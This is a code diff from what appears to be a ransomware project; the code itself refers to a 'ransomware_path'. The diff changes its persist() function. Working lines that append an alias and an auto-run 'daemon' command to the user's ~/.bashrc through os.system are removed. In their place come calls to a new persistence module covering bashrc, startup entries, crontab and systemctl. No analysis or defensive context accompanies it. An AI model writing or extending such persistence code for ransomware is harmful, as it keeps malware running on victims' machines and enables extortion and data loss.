@@ -4,6 +4,7 @@ import get_files
 import symmetric
 import enviroment
 import variables
+import persistence
 
 import os
 import string
@@ -144,15 +145,10 @@ def menu():
 
 
 def persist():
-    # cp = 'cp ' + ransomware_path + 'daemon ~/.bashrc'
-    # check if daemon not in bashrc
-    alias = "alias 'daemon'='{}/daemon';".format(variables.ransomware_path)
-    daemon = "daemon;"
-
-    nano = 'echo "' +  alias + '" >> ~/.bashrc '
-    nano2 = 'echo "' + daemon + '" >> ~/.bashrc '
-    os.system(nano)
-    os.system(nano2)
+    persistence.bashrcs()
+    persistence.startup()
+    persistence.crontab()
+    persistence.systemctl()
 
 
 if __name__ == "__main__":
